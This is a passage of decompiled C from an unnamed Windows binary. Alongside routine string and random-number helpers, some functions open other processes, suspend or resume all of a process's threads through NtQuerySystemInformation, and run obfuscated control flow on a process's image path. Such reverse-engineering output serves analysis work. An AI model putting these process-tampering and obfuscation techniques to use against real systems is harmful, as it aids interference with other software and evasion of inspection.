      uVar1 = (uint)lVar4;
    }
  }
  return (int)((ulonglong)lVar4 >> 0x20) + param_3 ^ 0x80000000;
}



/* ==================================================================== */
/* FUN_140025670 @ 140025670 */

undefined8 *
FUN_140025670(undefined8 *param_1,ulonglong param_2,undefined8 param_3,longlong param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  ulonglong uVar3;
  void *_Src;
  size_t _Size;
  void *_Dst;
  longlong lVar4;
  ulonglong uVar5;
  void *_Memory;
  ulonglong uVar6;
  undefined2 *puVar7;

  lVar2 = param_1[2];
  uVar6 = 0x7ffffffffffffffe;
  if (0x7ffffffffffffffeU - lVar2 < param_2) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar3 = param_1[3];
  uVar5 = param_2 + lVar2 | 7;
  if ((uVar5 < 0x7fffffffffffffff) && (uVar3 <= 0x7ffffffffffffffe - (uVar3 >> 1))) {
    uVar1 = (uVar3 >> 1) + uVar3;
    uVar6 = uVar5;
    if (uVar5 < uVar1) {
      uVar6 = uVar1;
    }
    uVar5 = uVar6 + 1;
    if (0x7fffffffffffffff < uVar5) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  else {
    uVar5 = 0x7fffffffffffffff;
  }
  _Dst = (void *)FUN_14000e6b0(uVar5 * 2);
  param_1[3] = uVar6;
  _Size = lVar2 * 2;
  param_1[2] = param_2 + lVar2;
  if (uVar3 < 8) {
    memcpy(_Dst,param_1,_Size);
    if (param_4 != 0) {
      puVar7 = (undefined2 *)(_Size + (longlong)_Dst);
      for (lVar4 = param_4; lVar4 != 0; lVar4 = lVar4 + -1) {
        *puVar7 = 0;
        puVar7 = puVar7 + 1;
      }
    }
    *(undefined2 *)((longlong)_Dst + (param_4 + lVar2) * 2) = 0;
  }
  else {
    _Src = (void *)*param_1;
    memcpy(_Dst,_Src,_Size);
    if (param_4 != 0) {
      puVar7 = (undefined2 *)(_Size + (longlong)_Dst);
      for (lVar4 = param_4; lVar4 != 0; lVar4 = lVar4 + -1) {
        *puVar7 = 0;
        puVar7 = puVar7 + 1;
      }
    }
    *(undefined2 *)((longlong)_Dst + (param_4 + lVar2) * 2) = 0;
    _Memory = _Src;
    if ((0xfff < uVar3 * 2 + 2) &&
       (_Memory = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = _Dst;
  return param_1;
}



/* ==================================================================== */
/* FUN_1400257f0 @ 1400257f0 */

undefined8 * FUN_1400257f0(undefined8 *param_1,ulonglong param_2,undefined8 param_3,size_t param_4)

{
  ulonglong uVar1;
  size_t _Size;
  ulonglong uVar2;
  void *_Src;
  void *_Dst;
  ulonglong uVar3;
  ulonglong uVar4;
  void *_Memory;

  _Size = param_1[2];
  if (0x7fffffffffffffff - _Size < param_2) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar2 = param_1[3];
  uVar3 = param_2 + _Size | 0xf;
  uVar4 = 0x7fffffffffffffff;
  if ((uVar3 < 0x8000000000000000) && (uVar2 <= 0x7fffffffffffffff - (uVar2 >> 1))) {
    uVar1 = (uVar2 >> 1) + uVar2;
    uVar4 = uVar3;
    if (uVar3 < uVar1) {
      uVar4 = uVar1;
    }
  }
  _Dst = (void *)FUN_14000e6b0(uVar4 + 1);
  param_1[2] = param_2 + _Size;
  param_1[3] = uVar4;
  if (uVar2 < 0x10) {
    memcpy(_Dst,param_1,_Size);
    memset((void *)(_Size + (longlong)_Dst),0,param_4);
    *(undefined1 *)(_Size + param_4 + (longlong)_Dst) = 0;
  }
  else {
    _Src = (void *)*param_1;
    memcpy(_Dst,_Src,_Size);
    memset((void *)(_Size + (longlong)_Dst),0,param_4);
    *(undefined1 *)(_Size + param_4 + (longlong)_Dst) = 0;
    _Memory = _Src;
    if ((0xfff < uVar2 + 1) &&
       (_Memory = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = _Dst;
  return param_1;
}



/* ==================================================================== */
/* FUN_140025940 @ 140025940 */

undefined8 *
FUN_140025940(undefined8 *param_1,ulonglong param_2,undefined8 param_3,void *param_4,size_t param_5)

{
  ulonglong uVar1;
  size_t _Size;
  ulonglong uVar2;
  void *_Src;
  void *_Dst;
  ulonglong uVar3;
  ulonglong uVar4;
  void *pvVar5;

  _Size = param_1[2];
  if (0x7fffffffffffffff - _Size < param_2) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar3 = param_2 + _Size | 0xf;
  uVar2 = param_1[3];
  uVar4 = 0x7fffffffffffffff;
  if ((uVar3 < 0x8000000000000000) && (uVar2 <= 0x7fffffffffffffff - (uVar2 >> 1))) {
    uVar1 = uVar2 + (uVar2 >> 1);
    uVar4 = uVar3;
    if (uVar3 < uVar1) {
      uVar4 = uVar1;
    }
  }
  _Dst = (void *)FUN_14000e6b0(uVar4 + 1);
  param_1[2] = param_2 + _Size;
  param_1[3] = uVar4;
  pvVar5 = (void *)(_Size + (longlong)_Dst);
  if (uVar2 < 0x10) {
    memcpy(_Dst,param_1,_Size);
    memcpy(pvVar5,param_4,param_5);
    *(undefined1 *)(param_5 + (longlong)pvVar5) = 0;
  }
  else {
    _Src = (void *)*param_1;
    memcpy(_Dst,_Src,_Size);
    memcpy(pvVar5,param_4,param_5);
    *(undefined1 *)(param_5 + (longlong)pvVar5) = 0;
    pvVar5 = _Src;
    if ((0xfff < uVar2 + 1) &&
       (pvVar5 = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)pvVar5)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(pvVar5);
  }
  *param_1 = _Dst;
  return param_1;
}



/* ==================================================================== */
/* FUN_140025aa0 @ 140025aa0 */

void FUN_140025aa0(longlong *param_1)

{
  longlong *plVar1;

  plVar1 = *(longlong **)((longlong)*(int *)(*(longlong *)*param_1 + 4) + 0x48 + *param_1);
  if (plVar1 != (longlong *)0x0) {
    (**(code **)(*plVar1 + 0x10))();
  }
  return;
}



/* ==================================================================== */
/* FUN_140025ad0 @ 140025ad0 */

longlong * FUN_140025ad0(longlong *param_1,void *param_2,size_t param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  void *pvVar3;
  void *_Dst;
  ulonglong uVar4;
  void *_Memory;
  longlong *_Dst_00;
  ulonglong uVar5;

  uVar2 = param_1[3];
  if (param_3 <= uVar2) {
    _Dst_00 = param_1;
    if (0xf < uVar2) {
      _Dst_00 = (longlong *)*param_1;
    }
    param_1[2] = param_3;
    memmove(_Dst_00,param_2,param_3);
    *(undefined1 *)(param_3 + (longlong)_Dst_00) = 0;
    return param_1;
  }
  if (0x7fffffffffffffff < param_3) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar4 = param_3 | 0xf;
  uVar5 = 0x7fffffffffffffff;
  if ((uVar4 < 0x8000000000000000) && (uVar2 <= 0x7fffffffffffffff - (uVar2 >> 1))) {
    uVar1 = uVar2 + (uVar2 >> 1);
    uVar5 = uVar4;
    if (uVar4 < uVar1) {
      uVar5 = uVar1;
    }
  }
  _Dst = (void *)FUN_14000e6b0(uVar5 + 1);
  param_1[2] = param_3;
  param_1[3] = uVar5;
  memcpy(_Dst,param_2,param_3);
  *(undefined1 *)(param_3 + (longlong)_Dst) = 0;
  if (0xf < uVar2) {
    pvVar3 = (void *)*param_1;
    _Memory = pvVar3;
    if ((0xfff < uVar2 + 1) &&
       (_Memory = *(void **)((longlong)pvVar3 + -8),
       0x1f < (ulonglong)((longlong)pvVar3 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = (longlong)_Dst;
  return param_1;
}



/* ==================================================================== */
/* FUN_140025bf0 @ 140025bf0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

basic_streambuf<char,std::char_traits<char>_> *
FUN_140025bf0(basic_streambuf<char,std::char_traits<char>_> *param_1,char *param_2,int param_3)

{
  bool bVar1;
  _iobuf *p_Var2;
  undefined8 uVar3;
  codecvt_base *this;
  undefined8 *puVar4;
  undefined1 auStack_68 [32];
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  longlong *local_30;
  ulonglong local_28;

  local_28 = DAT_14005d040 ^ (ulonglong)auStack_68;
  if ((*(longlong *)(param_1 + 0x80) != 0) ||
     (p_Var2 = std::_Fiopen(param_2,param_3,0x40), p_Var2 == (_iobuf *)0x0)) {
    return (basic_streambuf<char,std::char_traits<char>_> *)0x0;
  }
  param_1[0x7c] = (basic_streambuf<char,std::char_traits<char>_>)0x1;
  param_1[0x71] = (basic_streambuf<char,std::char_traits<char>_>)0x0;
  std::basic_streambuf<char,std::char_traits<char>_>::_Init(param_1);
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  _get_stream_buffer_pointers(p_Var2,&local_48,&local_40,&local_38);
  *(undefined8 *)(param_1 + 0x18) = local_48;
  *(undefined8 *)(param_1 + 0x20) = local_48;
  *(undefined8 *)(param_1 + 0x38) = local_40;
  *(undefined8 *)(param_1 + 0x40) = local_40;
  *(undefined8 *)(param_1 + 0x50) = local_38;
  *(undefined8 *)(param_1 + 0x58) = local_38;
  *(_iobuf **)(param_1 + 0x80) = p_Var2;
  *(undefined8 *)(param_1 + 0x74) = DAT_140a61890;
  *(undefined8 *)(param_1 + 0x68) = 0;
  uVar3 = std::basic_streambuf<char,std::char_traits<char>_>::getloc(param_1);
  this = (codecvt_base *)FUN_140024db0(uVar3);
  bVar1 = std::codecvt_base::always_noconv(this);
  if (bVar1) {
    *(undefined8 *)(param_1 + 0x68) = 0;
  }
  else {
    *(codecvt_base **)(param_1 + 0x68) = this;
    std::basic_streambuf<char,std::char_traits<char>_>::_Init(param_1);
  }
  if ((local_30 != (longlong *)0x0) &&
     (puVar4 = (undefined8 *)(**(code **)(*local_30 + 0x10))(), puVar4 != (undefined8 *)0x0)) {
    (**(code **)*puVar4)(puVar4,1);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140025d30 @ 140025d30 */

void FUN_140025d30(longlong *param_1)

{
  longlong lVar1;
  longlong lVar2;

  lVar1 = param_1[1];
  for (lVar2 = *param_1; lVar2 != lVar1; lVar2 = lVar2 + 0x30) {
    FUN_14000e3a0(lVar2 + 0x18);
    FUN_14000e300(lVar2);
  }
  return;
}



/* ==================================================================== */
/* FUN_140025d70 @ 140025d70 */

void FUN_140025d70(void)

{
  code *pcVar1;

  std::_Xout_of_range("invalid string position");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* ==================================================================== */
/* FUN_140025d90 @ 140025d90 */

uint FUN_140025d90(uint *param_1)

{
  uint uVar1;
  uint uVar2;
  uint *puVar3;
  longlong lVar4;

  uVar2 = *param_1;
  lVar4 = 0x270;
  if (uVar2 == 0x270) {
    puVar3 = param_1 + 2;
    do {
      uVar2 = (puVar3[-1] ^ *puVar3) & 0x7fffffff ^ puVar3[-1];
      puVar3[0x26f] = -(uint)((uVar2 & 1) != 0) & 0x9908b0df ^ puVar3[0x18c] ^ uVar2 >> 1;
      lVar4 = lVar4 + -1;
      puVar3 = puVar3 + 1;
    } while (lVar4 != 0);
    uVar2 = *param_1;
  }
  else if (0x4df < uVar2) {
    lVar4 = 0xe3;
    puVar3 = param_1 + 0x272;
    do {
      uVar2 = (puVar3[-1] ^ *puVar3) & 0x7fffffff ^ puVar3[-1];
      puVar3[-0x271] = -(uint)((uVar2 & 1) != 0) & 0x9908b0df ^ puVar3[0x18c] ^ uVar2 >> 1;
      lVar4 = lVar4 + -1;
      puVar3 = puVar3 + 1;
    } while (lVar4 != 0);
    lVar4 = 0x18c;
    puVar3 = param_1 + 0x355;
    do {
      uVar2 = (puVar3[-1] ^ *puVar3) & 0x7fffffff ^ puVar3[-1];
      puVar3[-0x271] = -(uint)((uVar2 & 1) != 0) & 0x9908b0df ^ puVar3[-0x354] ^ uVar2 >> 1;
      lVar4 = lVar4 + -1;
      puVar3 = puVar3 + 1;
    } while (lVar4 != 0);
    uVar1 = (param_1[0x4e0] ^ param_1[1]) & 0x7fffffff ^ param_1[0x4e0];
    uVar2 = 0;
    param_1[0x270] = -(uint)((uVar1 & 1) != 0) & 0x9908b0df ^ uVar1 >> 1 ^ param_1[0x18d];
    *param_1 = 0;
  }
  uVar1 = param_1[(ulonglong)uVar2 + 1];
  *param_1 = uVar2 + 1;
  uVar1 = uVar1 >> 0xb & param_1[0x4e1] ^ uVar1;
  uVar1 = (uVar1 & 0xff3a58ad) << 7 ^ uVar1;
  uVar1 = (uVar1 & 0xffffdf8c) << 0xf ^ uVar1;
  return uVar1 >> 0x12 ^ uVar1;
}



/* ==================================================================== */
/* FUN_140025f30 @ 140025f30 */

undefined8 * FUN_140025f30(undefined8 *param_1,undefined4 param_2,DWORD param_3)

{
  HANDLE pvVar1;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  *(undefined4 *)(param_1 + 4) = 0x4b415a;
  *(undefined4 *)((longlong)param_1 + 0x24) = param_2;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[10] = param_1;
  param_1[0xb] = param_1;
  pvVar1 = OpenProcess(param_3,0,*(DWORD *)((longlong)param_1 + 0x24));
  param_1[6] = pvVar1;
  if (pvVar1 != (HANDLE)0x0) {
    SymInitialize(pvVar1,0,1);
    FUN_140039760(param_1);
    malloc(4);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140025fd0 @ 140025fd0 */

void FUN_140025fd0(longlong param_1)

{
  CloseHandle(*(HANDLE *)(param_1 + 0x30));
  CloseHandle(*(HANDLE *)(param_1 + 0x28));
  FUN_1400372d0(param_1 + 0x38);
  FUN_140025000(param_1);
  return;
}



/* ==================================================================== */
/* FUN_140026010 @ 140026010 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140026010(longlong param_1,char param_2)

{
  int iVar1;
  HMODULE hModule;
  INT_PTR IVar2;
  HANDLE hThread;
  uint *puVar3;
  uint uVar4;
  ulonglong uVar5;
  undefined1 auStack_58 [32];
  uint local_38 [2];
  uint *local_30;
  uint *puStack_28;
  uint *local_20;
  ulonglong local_18;

  local_18 = DAT_14005d040 ^ (ulonglong)auStack_58;
  if ((*(int *)(*(longlong *)ThreadLocalStoragePointer + 4) < DAT_140a618a8) &&
     (FUN_140051c5c(&DAT_140a618a8), DAT_140a618a8 == -1)) {
    hModule = GetModuleHandleA("ntdll.dll");
    DAT_140a618b0 = GetProcAddress(hModule,"NtQuerySystemInformation");
    _Init_thread_footer(&DAT_140a618a8);
  }
  if (DAT_140a618b0 != (FARPROC)0x0) {
    uVar4 = 0x10000;
    local_30 = (uint *)0x0;
    puStack_28 = (uint *)0x0;
    uVar5 = 0;
    local_20 = (uint *)0x0;
    local_30 = (uint *)FUN_14000e6b0(0x10000);
    puVar3 = local_30 + 0x4000;
    local_20 = puVar3;
    memset(local_30,0,0x10000);
    local_38[0] = 0;
    puStack_28 = puVar3;
    IVar2 = (*DAT_140a618b0)(5,local_30,0x10000,local_38);
    iVar1 = (int)IVar2;
    while (iVar1 != 0) {
      if ((int)IVar2 != -0x3ffffffc) goto LAB_1400261cc;
      if (local_38[0] != 0) {
        uVar4 = local_38[0];
      }
      uVar4 = uVar4 * 2;
      FUN_14000e4e0(&local_30,uVar4);
      local_38[0] = 0;
      IVar2 = (*DAT_140a618b0)(5,local_30,(ulonglong)uVar4,local_38);
      iVar1 = (int)IVar2;
    }
    uVar4 = local_30[0x14];
    puVar3 = local_30;
    while (uVar4 != *(uint *)(param_1 + 0x24)) {
      if (*puVar3 == 0) goto LAB_1400261cc;
      puVar3 = (uint *)((longlong)puVar3 + (ulonglong)*puVar3);
      uVar4 = puVar3[0x14];
    }
    if (puVar3[1] != 0) {
      do {
        hThread = OpenThread(2,0,puVar3[uVar5 * 0x14 + 0x4c]);
        if (hThread != (HANDLE)0x0) {
          if (param_2 == '\0') {
            ResumeThread(hThread);
          }
          else {
            SuspendThread(hThread);
          }
          CloseHandle(hThread);
        }
        uVar4 = (int)uVar5 + 1;
        uVar5 = (ulonglong)uVar4;
      } while (uVar4 < puVar3[1]);
    }
LAB_1400261cc:
    FUN_14000e3a0(&local_30);
  }
  return;
}



/* ==================================================================== */
/* FUN_140026200 @ 140026200 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

ulonglong * FUN_140026200(ulonglong *param_1,DWORD param_2)

{
  ulonglong uVar1;
  char *pcVar2;
  byte bVar3;
  code *pcVar4;
  BOOL BVar5;
  HANDLE hProcess;
  ulonglong uVar6;
  ulonglong uVar7;
  longlong lVar8;
  longlong lVar9;
  undefined8 ******ppppppuVar10;
  ulonglong *puVar11;
  byte bVar12;
  char cVar13;
  ulonglong uVar14;
  longlong lVar15;
  undefined4 *puVar16;
  ulonglong uVar17;
  ulonglong uVar18;
  char cVar19;
  undefined1 auStack_1f8 [32];
  byte local_1d8;
  byte bStack_1c9;
  undefined4 local_1c8;
  undefined4 local_1c4;
  undefined1 local_1c0;
  undefined8 local_1bf;
  undefined8 uStack_1b7;
  undefined2 local_1af;
  undefined8 ******local_1a0;
  undefined8 uStack_198;
  ulonglong local_190;
  ulonglong local_188;
  ulonglong *local_180;
  ulonglong local_178;
  ulonglong uStack_170;
  undefined8 local_168;
  undefined8 uStack_160;
  CHAR local_158;
  char acStack_157 [271];
  ulonglong local_48;
  undefined4 uStack_3e;

  local_48 = DAT_14005d040 ^ (ulonglong)auStack_1f8;
  local_180 = param_1;
  hProcess = OpenProcess(0x1000,0,param_2);
  if (hProcess != (HANDLE)0x0) {
    local_180 = (ulonglong *)CONCAT44(local_180._4_4_,0x104);
    BVar5 = QueryFullProcessImageNameA(hProcess,0,&local_158,(PDWORD)&local_180);
    if (BVar5 != 0) {
      CloseHandle(hProcess);
      local_1a0 = (undefined8 ******)0x0;
      uStack_198 = 0;
      local_190 = 0;
      local_188 = 0;
      lVar15 = -1;
      do {
        pcVar2 = acStack_157 + lVar15;
        lVar15 = lVar15 + 1;
      } while (*pcVar2 != '\0');
      FUN_140024ce0(&local_1a0,&local_158);
      local_1c8 = 0x6464a896;
      local_1c4 = 0x1a646259;
      local_1c0 = 0xf4;
      local_1bf = 0;
      uStack_1b7 = 0;
      local_1af = 0;
LAB_140026330:
      uVar6 = DAT_140a618c8;
      uVar18 = DAT_140a618d0;
LAB_140026340:
      uVar14 = 0;
      uVar7 = uVar6;
      uVar17 = uVar18;
LAB_140026343:
      if (0x1a < uVar14) {
        puVar16 = &local_1c8;
LAB_140026dbd:
        uVar18 = 0xffffffffffffffff;
        do {
          uVar18 = uVar18 + 1;
        } while (*(char *)((longlong)puVar16 + uVar18) != '\0');
        ppppppuVar10 = &local_1a0;
        if (0xf < local_188) {
          ppppppuVar10 = local_1a0;
        }
        if (local_190 < uVar18) {
LAB_140026ee0:
          *param_1 = 0;
          param_1[1] = 0;
          param_1[2] = 0;
          param_1[3] = 0;
          FUN_140024ce0(param_1,&DAT_1400571d0,0);
        }
        else {
          if (uVar18 == 0) {
            uVar18 = 0;
          }
          else {
            lVar15 = local_190 + (longlong)ppppppuVar10;
            lVar8 = thunk_FUN_140051630(ppppppuVar10,lVar15);
            if ((lVar8 == lVar15) ||
               (uVar18 = lVar8 - (longlong)ppppppuVar10, uVar18 == 0xffffffffffffffff))
            goto LAB_140026ee0;
          }
          ppppppuVar10 = &local_1a0;
          if (0xf < local_188) {
            ppppppuVar10 = local_1a0;
          }
          lVar15 = -1;
          if (uVar18 < local_190) {
            lVar8 = local_190 + (longlong)ppppppuVar10;
            lVar9 = thunk_FUN_140051530((longlong)ppppppuVar10 + uVar18,lVar8,0x5c);
            if (lVar9 != lVar8) {
              lVar15 = lVar9 - (longlong)ppppppuVar10;
            }
          }
          local_178 = 0;
          uStack_170 = 0;
          local_168 = 0;
          uStack_160 = 0;
          if (local_190 < uVar18) {
            FUN_140025d70();
            pcVar4 = (code *)swi(3);
            puVar11 = (ulonglong *)(*pcVar4)();
            return puVar11;
          }
          uVar6 = lVar15 - uVar18;
          if (local_190 - uVar18 < lVar15 - uVar18) {
            uVar6 = local_190 - uVar18;
          }
          ppppppuVar10 = &local_1a0;
          if (0xf < local_188) {
            ppppppuVar10 = local_1a0;
          }
          FUN_140024ce0(&local_178,(longlong)ppppppuVar10 + uVar18,uVar6);
          *param_1 = local_178;
          param_1[1] = uStack_170;
          *(undefined4 *)(param_1 + 2) = (undefined4)local_168;
          *(undefined4 *)((longlong)param_1 + 0x14) = local_168._4_4_;
          *(undefined4 *)(param_1 + 3) = (undefined4)uStack_160;
          *(undefined4 *)((longlong)param_1 + 0x1c) = uStack_160._4_4_;
          local_168 = 0;
          uStack_160 = 0xf;
          local_178 = local_178 & 0xffffffffffffff00;
          FUN_140025000(&local_178);
        }
        FUN_140025000(&local_1a0);
        return param_1;
      }
      bVar3 = acStack_157[uVar14 - 0x71];
LAB_140026353:
      if (uVar14 < uVar7) {
        puVar16 = (undefined4 *)(auStack_1f8 + 0x16eecd6);
        goto LAB_140026dbd;
      }
      cVar13 = (char)uVar14;
      if (uVar17 + 1 <= uVar7) {
        if (uVar7 == uVar17 + 1) {
          local_1d8 = ('\x15' - (bVar3 & cVar13 - 6U)) * '\x02' + bVar3 + (cVar13 - 6U);
          uVar14 = uVar14 + (byte)acStack_157[uVar14 - 0x71] + uVar17 + 1;
        }
        else {
          if (uVar7 == uVar17 + 2) {
            local_1d8 = ('1' - (bVar3 & cVar13 - 0xeU)) * '\x02' + bVar3 + (cVar13 - 0xeU);
            goto LAB_140026cdd;
          }
          if (uVar7 == uVar17 + 3) {
            local_1d8 = (cVar13 - 0x16U) + bVar3 + (bVar3 & cVar13 - 0x16U) * -2 + 0x9a;
            goto LAB_140026ca9;
          }
          if (uVar7 == uVar17 + 5) {
            local_1d8 = bVar3 + (bVar3 & cVar13 - 0x1aU) * -2 + -0x4a + (cVar13 - 0x1aU);
            goto LAB_140026c74;
          }
          if (uVar7 != uVar17 + 7) goto LAB_1400263b7;
          local_1d8 = cVar13 + bVar3 + (cVar13 - 0x1eU & bVar3) * -2 + 0xb4;
        }
        goto LAB_140026343;
      }
      local_1d8 = (cVar13 - 2U) + (cVar13 - 2U & bVar3) * -2 + '\x0e' + bVar3;
LAB_1400263b7:
      if (uVar14 < uVar17) {
        puVar16 = (undefined4 *)(auStack_1f8 + 0x15c86d8);
        goto LAB_140026dbd;
      }
      if (uVar17 + 0x80 <= uVar7) {
        if (uVar7 == uVar17 + 1) {
          bVar12 = cVar13 - 0x2e;
          cVar19 = '\n';
LAB_140026c04:
          cVar19 = (cVar19 - (bVar12 & bVar3)) * '\x02' + bVar3;
          goto LAB_140026c10;
        }
        if (uVar7 == uVar17 + 2) {
          local_1d8 = ('\x16' - (cVar13 - 0x32U & bVar3)) * '\x02' + bVar3 + cVar13;
          uVar17 = uVar17 + 1;
        }
        else if (uVar7 == uVar17 + 3) {
          local_1d8 = ('\"' - (cVar13 - 0x36U & bVar3)) * '\x02' + bVar3 + cVar13;
        }
        else {
          if (uVar7 != uVar17 + 5) goto LAB_140026420;
          local_1d8 = cVar13 + bVar3 + (cVar13 + 0xbeU & bVar3) * -2 + 0x8c;
          uVar14 = uVar14 - local_1d8;
        }
        goto LAB_140026343;
      }
      local_1d8 = bVar3 + (cVar13 - 0x2aU & bVar3) * -2 + -4 + cVar13;
LAB_140026420:
      while (uVar18 = uVar17, uVar14 < uVar17 + uVar7) {
        while( true ) {
          do {
            uVar17 = uVar18;
            if (uVar7 == uVar17 + 0x2a) {
              bVar12 = cVar13 + 0x24;
              cVar19 = '\x14';
              goto LAB_140026c04;
            }
            if (uVar7 == uVar17 + 0x42) {
              local_1d8 = (' ' - (cVar13 + 0x20U & bVar3)) * '\x02' + bVar3 + cVar13;
              uVar17 = uVar17 + 1;
              goto LAB_140026343;
            }
            if (uVar7 == uVar17 + 3) {
              local_1d8 = (',' - (cVar13 + 0x1cU & bVar3)) * '\x02' + bVar3 + cVar13;
              goto LAB_140026343;
            }
            uVar6 = uVar17 + 0x200;
            if (uVar7 == uVar6) {
              local_1d8 = ('8' - (cVar13 + 0x18U & bVar3)) * '\x02' + bVar3 + cVar13;
              goto LAB_140026c74;
            }
            if (uVar7 == uVar17 + 6) {
              local_1d8 = cVar13 + bVar3 + (cVar13 + 0x14U & bVar3) * -2 + 0x88;
              goto LAB_140026ca9;
            }
            if (uVar7 == uVar17 + 0x1000) {
              local_1d8 = cVar13 + bVar3 + (cVar13 + 0x10U & bVar3) * -2 + 0xa0;
              uVar14 = uVar14 - local_1d8;
              goto LAB_140026343;
            }
            if (uVar7 == uVar17 + 1000) {
              local_1d8 = bVar3 + (cVar13 + 0xcU & bVar3) * -2 + -0x48 + cVar13;
              goto LAB_140026cdd;
            }
            if (uVar7 == uVar17 + 8) {
              local_1d8 = bVar3 + (cVar13 + 8U & bVar3) * -2 + -0x30 + cVar13;
              goto LAB_140026d06;
            }
            if (uVar7 == uVar17 + 0x61) {
              local_1d8 = (cVar13 + bVar3 + (cVar13 + 4U & bVar3) * -2) - 0x18;
              uVar14 = uVar14 + (byte)acStack_157[uVar14 - 0x71] + uVar17 + 1;
              goto LAB_140026343;
            }
            uVar18 = uVar17;
          } while (uVar7 == uVar17 + 0x10);
          uVar18 = uVar17 + 0x25a;
          if (uVar6 < uVar17 + 0x260) {
            local_1d8 = ('\x12' - (cVar13 - 6U & bVar3)) * '\x02' + cVar13 + bVar3;
            goto LAB_140026330;
          }
          if (uVar6 < uVar17 + 0x125a) {
            local_1d8 = ('\x1e' - (cVar13 - 10U & bVar3)) * '\x02' + cVar13 + bVar3;
            goto LAB_140026340;
          }
          uVar7 = uVar6;
          if (uVar6 < uVar17 + 0x264) {
            local_1d8 = ('*' - (cVar13 - 0xeU & bVar3)) * '\x02' + bVar3 + cVar13;
            uVar17 = uVar18;
            goto LAB_140026353;
          }
          uVar1 = uVar17 + 0x29b;
          if (uVar6 < uVar1) {
            local_1d8 = ('6' - (cVar13 - 0x12U & bVar3)) * '\x02' + bVar3 + cVar13;
            uVar17 = uVar18;
            goto LAB_1400263b7;
          }
          if (uVar6 < uVar17 + 0x282) break;
          if (uVar6 < uVar17 + 0x25b) {
            cVar19 = bVar3 + (cVar13 - 0x1aU & bVar3) * -2 + -100;
            uVar17 = uVar18;
            goto LAB_1400267fd;
          }
          if (uVar6 < uVar17 + 0x2be) {
            cVar19 = bVar3 + (cVar13 - 0x1eU & bVar3) * -2 + -0x4c;
            uVar17 = uVar18;
            goto LAB_1400267b8;
          }
          if (uVar6 < uVar17 + 0x29a) {
            cVar19 = bVar3 + (cVar13 - 0x22U & bVar3) * -2 + -0x34;
            uVar17 = uVar18;
            goto LAB_14002677c;
          }
          if (uVar6 < uVar17 + 0x25c) {
            local_1d8 = (cVar13 + bVar3 + (cVar13 - 0x26U & bVar3) * -2) - 0x1c;
            uVar17 = uVar18;
            goto LAB_14002675c;
          }
          if (uVar17 + 0x2da <= uVar6) {
            uVar18 = uVar17 + 0x2a0;
            uVar7 = uVar1;
            if (uVar17 + 0x2c8 < uVar1) {
              local_1d8 = ('\x10' - (cVar13 - 0x30U & bVar3)) * '\x02' + bVar3 + cVar13;
              uVar14 = uVar14 + (byte)acStack_157[uVar14 - 0x71] + uVar18 + 1;
              uVar17 = uVar18;
              goto LAB_140026343;
            }
            if (uVar17 + 0x2a1 < uVar1) {
              local_1d8 = ('\x1c' - (cVar13 - 0x34U & bVar3)) * '\x02' + bVar3 + cVar13;
              uVar17 = uVar18;
              goto LAB_140026d06;
            }
            if (uVar17 + 0x304 < uVar1) {
              local_1d8 = ('(' - (cVar13 - 0x38U & bVar3)) * '\x02' + bVar3 + cVar13;
              uVar17 = uVar18;
              goto LAB_140026cdd;
            }
            if (uVar17 + 0x2a4 < uVar1) {
              local_1d8 = ('4' - (cVar13 - 0x3cU & bVar3)) * '\x02' + bVar3 + cVar13;
              uVar14 = uVar14 - local_1d8;
              uVar17 = uVar18;
              goto LAB_140026343;
            }
            if (uVar17 + 0x688 < uVar1) {
              local_1d8 = cVar13 + bVar3 + (cVar13 - 0x40U & bVar3) * -2 + 0x80;
              uVar17 = uVar18;
              goto LAB_140026ca9;
            }
            if (uVar17 + 0x2a8 < uVar1) {
              local_1d8 = bVar3 + (cVar13 + 0xbcU & bVar3) * -2 + -0x68 + cVar13;
              uVar17 = uVar18;
              goto LAB_140026c74;
            }
            if (uVar17 + 0x301 < uVar1) {
              local_1d8 = cVar13 + bVar3 + (cVar13 + 0xb8U & bVar3) * -2 + 0xb0;
              uVar17 = uVar18;
              goto LAB_140026343;
            }
            if (uVar17 + 0x2b0 < uVar1) {
              local_1d8 = (cVar13 + bVar3 + (cVar13 + 0xb4U & bVar3) * -2) - 0x38;
              uVar17 = uVar17 + 0x2a1;
              goto LAB_140026343;
            }
            if (uVar17 + 0x2a9 < uVar1) {
